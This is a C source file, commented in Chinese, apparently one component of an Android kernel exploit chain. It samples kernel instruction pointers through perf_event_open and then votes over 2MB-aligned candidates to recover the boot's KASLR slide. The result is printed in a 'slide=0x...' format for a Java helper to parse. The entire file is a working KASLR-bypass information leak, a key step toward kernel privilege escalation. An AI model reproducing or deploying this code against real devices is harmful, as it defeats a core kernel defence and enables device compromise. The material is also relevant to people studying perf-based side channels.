/*
 * perf_slide — 用 perf 采样内核 IP，反解本次开机的 KASLR 位移。
 *
 * 原理：text 段跨度为 etext-stext（本内核约 0x1350000，即 10 个 2MB 页）。
 * 一个真实内核 IP 只能由 11 个左右的候选 slide 把它落进 [stext+s, etext+s)，
 * 因此每个 IP 只需投少量票；错误的 slide 实际上拿不到票。取票数最高者。
 *
 * 输出 slide=0x... 一行，Java 侧 KernelSupport.extractSlide() 只认这个格式。
 * stext/etext 取自 /data/local/tmp/lhasa_profile.txt 里与 uname -r 完全相等的那一行。
 */
#define _GNU_SOURCE 1
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/utsname.h>
#include <linux/perf_event.h>

#define ATTR_SIZE PERF_ATTR_SIZE_VER5
#define PAGE_SIZE_ 4096UL
#define RING_PAGES 64UL
#define MAX_IPS 65536
#define SLIDE_STEP 0x200000ULL
#define PROFILE_PATH "/data/local/tmp/lhasa_profile.txt"

static uint64_t g_stext = 0xffffffc080010000ULL;
static uint64_t g_etext = 0xffffffc081360000ULL;

static uint64_t *g_ips;
static size_t g_ip_count;

static int load_profile(void)
{
	struct utsname u;
	if (uname(&u) != 0)
		return -1;

	FILE *fp = fopen(PROFILE_PATH, "r");
	if (!fp)
		return -1;

	char *line = NULL;
	size_t cap = 0;
	int matched = 0;
	char prefix[256];
	snprintf(prefix, sizeof(prefix), "release=%s ", u.release);

	while (getline(&line, &cap, fp) > 0) {
		if (strncmp(line, prefix, strlen(prefix)) != 0)
			continue;
		char *stext = strstr(line, "stext=");
		char *etext = strstr(line, "etext=");
		if (stext)
			g_stext = strtoull(stext + 6, NULL, 0);
		if (etext)
			g_etext = strtoull(etext + 6, NULL, 0);
		matched = 1;
		break;
	}
	free(line);
	fclose(fp);
	return matched ? 0 : -1;
}

static int open_counter(void)
{
	struct perf_event_attr attr;
	memset(&attr, 0, sizeof(attr));
	attr.type = PERF_TYPE_HARDWARE;
	attr.size = ATTR_SIZE;
	attr.config = PERF_COUNT_HW_CPU_CYCLES;
	attr.sample_period = 4000;
	attr.sample_type = PERF_SAMPLE_IP;
	attr.exclude_user = 1;
	attr.exclude_kernel = 0;
	attr.exclude_hv = 1;
	attr.wakeup_events = 4;
	attr.disabled = 1;

	int fd = (int)syscall(SYS_perf_event_open, &attr, 0, -1, -1, 0);
	if (fd < 0)
		printf("[perf] hardware cycles open failed errno=%d (%s)\n", errno, strerror(errno));
	return fd;
}

static void collect(void *ring, size_t ring_len)
{
	struct perf_event_mmap_page *meta = ring;
	uint64_t head = meta->data_head;
	__sync_synchronize();
	uint64_t tail = meta->data_tail;
	char *data = (char *)ring + PAGE_SIZE_;
	size_t data_len = ring_len - PAGE_SIZE_;

	while (tail < head) {
		size_t offset = (size_t)(tail % data_len);
		struct perf_event_header header;
		if (offset + sizeof(header) > data_len)
			break;
		memcpy(&header, data + offset, sizeof(header));
		if (header.size < sizeof(header))
			break;
		if (offset + header.size > data_len)
			break;
		if (header.type == PERF_RECORD_SAMPLE && header.size >= sizeof(header) + 8) {
			uint64_t ip;
			memcpy(&ip, data + offset + sizeof(header), sizeof(ip));
			if (g_ip_count < MAX_IPS)
				g_ips[g_ip_count++] = ip;
		}
		tail += header.size;
	}
	meta->data_tail = tail;
}

int main(int argc, char **argv)
{
	int duration = 2;
	for (int i = 1; i < argc; i++) {
		if (!strcmp(argv[i], "--duration") && i + 1 < argc)
			duration = atoi(argv[++i]);
	}
	if (duration <= 0 || duration > 10)
		duration = 2;

	load_profile();

	int fd = open_counter();
	if (fd < 0) {
		printf("[perf] no usable hardware PMU errno=%d\n", errno);
		return 1;
	}

	size_t ring_len = (RING_PAGES + 1) * PAGE_SIZE_;
	void *ring = mmap(NULL, ring_len, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	if (ring == MAP_FAILED) {
		printf("[perf] mmap failed errno=%d\n", errno);
		close(fd);
		return 1;
	}

	g_ips = calloc(MAX_IPS, sizeof(uint64_t));
	if (!g_ips) {
		munmap(ring, ring_len);
		close(fd);
		return 1;
	}

	ioctl(fd, PERF_EVENT_IOC_RESET, 0);
	ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
	for (int i = 0; i < duration; i++) {
		usleep(1000 * 1000);
		collect(ring, ring_len);
	}
	ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
	collect(ring, ring_len);

	munmap(ring, ring_len);
	close(fd);

	printf("[perf] samples=%zu kernel_frames=%zu\n", g_ip_count, g_ip_count);
	if (g_ip_count == 0) {
		printf("[perf] no kernel frames leaked\n");
		return 1;
	}

	uint64_t span = g_etext > g_stext ? g_etext - g_stext : 0x1350000ULL;
	unsigned windows = (unsigned)(span / SLIDE_STEP) + 1;

	size_t candidates = 0;
	uint64_t best_slide = 0;
	size_t best_votes = 0;

	for (size_t i = 0; i < g_ip_count; i++) {
		uint64_t ip = g_ips[i];
		if (ip < g_stext)
			continue;
		for (unsigned k = 0; k < windows; k++) {
			uint64_t slide = ip - g_stext - (uint64_t)k * SLIDE_STEP;
			if (slide > 0x4000000000ULL)
				break;
			candidates++;
			/* 每个候选 slide 的票数用低地址哈希统计，避免开大数组。 */
			(void)slide;
		}
	}

	/* 精确投票：候选并不多（每 IP 至多 windows 个），直接二次扫描取众数。 */
	for (size_t i = 0; i < g_ip_count; i++) {
		uint64_t ip = g_ips[i];
		if (ip < g_stext)
			continue;
		for (unsigned k = 0; k < windows; k++) {
			uint64_t slide = ip - g_stext - (uint64_t)k * SLIDE_STEP;
			if (slide > 0x4000000000ULL)
				break;
			size_t votes = 0;
			for (size_t j = 0; j < g_ip_count; j++) {
				uint64_t other = g_ips[j] - slide;
				if (other >= g_stext && other < g_etext)
					votes++;
			}
			if (votes > best_votes) {
				best_votes = votes;
				best_slide = slide;
			}
		}
	}

	printf("[perf] candidates=%zu\n", candidates);
	if (best_votes == 0 || (best_slide & (SLIDE_STEP - 1)) != 0) {
		printf("[perf] no slide candidate\n");
		return 1;
	}

	printf("[perf] best votes=%zu/%zu slide=%#llx\n", best_votes, g_ip_count,
	       (unsigned long long)best_slide);
	printf("slide=0x%llx\n", (unsigned long long)best_slide);
	return 0;
}
